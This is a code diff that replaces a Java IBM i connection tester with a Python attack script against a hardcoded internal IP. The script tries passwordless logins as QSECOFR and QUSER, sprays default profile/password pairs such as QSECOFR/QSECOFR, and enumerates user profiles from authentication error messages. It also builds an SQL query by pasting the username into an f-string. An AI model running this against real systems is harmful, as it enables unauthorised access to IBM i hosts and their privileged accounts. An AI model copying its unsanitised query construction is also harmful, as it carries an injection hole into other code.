@@ -1,50 +1,134 @@
-import com.ibm.as400.access.*;
+#!/usr/bin/env python3
+import jaydebeapi
+import sys
+import os
 
-public class TestIBMi {
-    public static void main(String[] args) {
-        if (args.length < 2) {
-            System.out.println("Usage: java -cp jt400.jar:. TestIBMi <host> <username> [password]");
-            System.exit(1);
-        }
+# Configuration
+JT400_JAR = "jt400-21.0.6.jar"  # Update path as needed
+TARGET = "10.224.56.66"
+
+def test_connection(username, password=""):
+    """Test JDBC connection to IBM i"""
+    print(f"\n[*] Testing connection to {TARGET} as {username}...")
+    
+    jdbc_url = f"jdbc:as400://{TARGET}"
+    
+    try:
+        conn = jaydebeapi.connect(
+            "com.ibm.as400.access.AS400JDBCDriver",
+            jdbc_url,
+            [username, password],
+            JT400_JAR
+        )
         
-        String host = args[0];
-        String username = args[1];
-        String password = args.length > 2 ? args[2] : "";  // Empty password for testing
+        print(f"[+] SUCCESS! Connected as {username}")
         
-        try {
-            System.out.println("[*] Connecting to " + host + " as " + username + "...");
-            
-            // Create AS400 object
-            AS400 system = new AS400(host, username, password);
-            
-            // Test connection (this will attempt authentication)
-            system.connectService(AS400.COMMAND);
-            
-            System.out.println("[+] SUCCESS! Connected to IBM i");
-            System.out.println("[+] System: " + system.getSystemName());
-            System.out.println("[+] User: " + system.getUserId());
-            
-            // Get system info
-            try {
-                SystemValue sv = new SystemValue(system, "QOSVRM");
-                System.out.println("[+] OS Version: " + sv.getValue());
-            } catch (Exception e) {
-                System.out.println("[!] Could not get OS version");
-            }
-            
-            system.disconnectAllServices();
-            
-        } catch (AS400SecurityException e) {
-            System.out.println("[-] AUTHENTICATION FAILED: " + e.getMessage());
-            System.out.println("[*] Return code: " + e.getReturnCode());
-            // Return codes:
-            // 0x0001 = Password not correct
-            // 0x0002 = User ID not correct
-            // 0x0003 = Password expired
-            // 0x0004 = User ID disabled
-        } catch (Exception e) {
-            System.out.println("[-] CONNECTION FAILED: " + e.getMessage());
-            e.printStackTrace();
-        }
-    }
-}
+        # Get connection info
+        cursor = conn.cursor()
+        cursor.execute("SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1")
+        result = cursor.fetchone()
+        print(f"[+] Database confirms user: {result[0]}")
+        
+        # Try to get system info
+        try:
+            cursor.execute("SELECT SYSTEM_VALUE_NAME, CURRENT_VALUE FROM QSYS2.SYSTEM_VALUE_INFO WHERE SYSTEM_VALUE_NAME = 'QOSVRM'")
+            result = cursor.fetchone()
+            print(f"[+] OS Version: {result[1]}")
+        except Exception as e:
+            print(f"[!] Could not get OS version: {e}")
+        
+        # Check user authorities
+        try:
+            cursor.execute(f"SELECT SPECIAL_AUTHORITIES FROM QSYS2.USER_INFO WHERE USER_NAME = '{username}'")
+            result = cursor.fetchone()
+            if result and result[0]:
+                print(f"[+] Special Authorities: {result[0]}")
+        except Exception as e:
+            print(f"[!] Could not get authorities: {e}")
+        
+        cursor.close()
+        conn.close()
+        return True
+        
+    except Exception as e:
+        print(f"[-] FAILED: {e}")
+        return False
+
+def test_default_passwords():
+    """Test common IBM i default passwords"""
+    profiles = [
+        ("QSECOFR", "QSECOFR"),
+        ("QSYSOPR", "QSYSOPR"),
+        ("QPGMR", "QPGMR"),
+        ("QUSER", "QUSER"),
+        ("QOPER", "QOPER"),
+        ("QSRV", "QSRV"),
+    ]
+    
+    print("\n" + "="*60)
+    print("TESTING DEFAULT PASSWORDS")
+    print("="*60)
+    
+    for username, password in profiles:
+        if test_connection(username, password):
+            print(f"\n[!!!] DEFAULT PASSWORD WORKS: {username}/{password}")
+            return True
+    
+    print("\n[-] No default passwords worked")
+    return False
+
+def test_unauthenticated():
+    """Test for unauthenticated access (DRDA misconfiguration)"""
+    print("\n" + "="*60)
+    print("TESTING UNAUTHENTICATED ACCESS")
+    print("="*60)
+    
+    # Try connecting without password
+    if test_connection("QSECOFR", ""):
+        print("\n[!!!] CRITICAL: UNAUTHENTICATED ACCESS AS QSECOFR!")
+        return True
+    
+    if test_connection("QUSER", ""):
+        print("\n[!!!] CRITICAL: UNAUTHENTICATED ACCESS AS QUSER!")
+        return True
+    
+    print("\n[-] Unauthenticated access not possible")
+    return False
+
+def enumerate_users():
+    """Try to enumerate user profiles (if we have access)"""
+    print("\n" + "="*60)
+    print("ATTEMPTING USER ENUMERATION")
+    print("="*60)
+    
+    # First try with common credentials
+    test_users = ["QSECOFR", "QSYSOPR", "QPGMR", "QUSER", "QOPER", "QSRV", "QDBSHR"]
+    
+    for user in test_users:
+        try:
+            conn = jaydebeapi.connect(
+                "com.ibm.as400.access.AS400JDBCDriver",
+                f"jdbc:as400://{TARGET}",
+                [user, user],  # Try user/user
+                JT400_JAR
+            )
+            print(f"[+] Valid credentials found: {user}/{user}")
+            conn.close()
+        except Exception as e:
+            if "password" in str(e).lower() or "authentication" in str(e).lower():
+                print(f"[*] User {user} exists (auth failed)")
+            else:
+                print(f"[-] User {user} - {e}")
+
+if __name__ == "__main__":
+    print("IBM i Connection Tester")
+    print("Target: " + TARGET)
+    
+    # Test 1: Unauthenticated access
+    test_unauthenticated()
+    
+    # Test 2: Default passwords
+    test_default_passwords()
+    
+    # Test 3: User enumeration
+    enumerate_users()
